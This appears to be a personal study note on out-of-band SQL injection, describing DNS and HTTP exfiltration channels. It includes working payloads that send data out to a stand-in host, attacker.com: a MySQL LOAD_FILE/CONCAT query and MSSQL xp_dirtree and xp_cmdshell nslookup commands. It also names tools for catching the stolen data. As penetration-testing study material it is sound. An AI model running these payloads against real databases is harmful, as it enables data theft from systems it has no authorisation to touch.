[[SQL]]

### OOB
Out-of-band: not direct web response, force database to reach out to attacker controlled server through separate channel (DNS/HTTP) and carry stolen data with it

Database server needs to be able to make outbound connections

Channels
- Attack channel: normal web request with injection paylaod
- Data channel: outbound network request used to exfiltrate data

##### DNS Exfiltration

```sql
SELECT LOAD_FILE(CONCAT('\\\\', (SELECT database()), '.attacker.com\\share'));
```

1. `(SELECT database())` pulls database name
   --> `webapp_db`
2. `CONCAT()` builds string `\\webapp_db.attacker.com\share`
3. `LOAD_FILE()` tries to read that file path. On Windows, this initiates DNS lookup for `webapp_db.attacker.com`
4. DNS server catches request and logs `webapp_db` (data in subdomain)

**/!\\ subdomain label limit: 63 characters**

##### MSSQL

(Microsoft SQL)

`xp_dirtree` triggers DNS lookup, trying to list directory on remote server
```sql
EXEC master..xp_dirtree '\\attacker.com\share';
```

`xp_cmdshell` (off by default, so `xp_dirtree` more commonly available) runs OS commands directly --> `nslookup`, `curl`
```sql
EXEC xp_cmdshell 'nslookup data.attacker.com';
```

Data Reception
- **Burp Collaborator:** gives unique subdomain, logs DNS/HTTP requests to it
- **Interactsh:** same but free, self-hostable
- **Custom listener:** Python DNS (`dnslib`), HTTP server